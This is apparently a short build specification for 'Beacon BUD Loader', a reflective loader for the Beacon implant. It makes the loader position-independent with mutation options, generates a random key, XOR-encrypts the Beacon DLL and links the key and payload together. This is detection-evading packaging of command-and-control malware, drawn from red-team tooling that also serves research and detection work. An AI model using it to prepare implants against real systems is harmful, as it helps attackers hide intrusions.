name     "Beacon BUD Loader"
describe "Reflective Loader to pass memory allocation information via Beacon User Data"
author   "Daniel Duggan (@_RastaMouse)"

x64:
	load "bin/loader.x64.o"
		make pic +optimize +disco +mutate

		generate $KEY 8192

		push $DLL
			xor $KEY
			preplen
			link "beacon_dll"
		
		push $KEY
			preplen
			link "xor_key"
	
	export
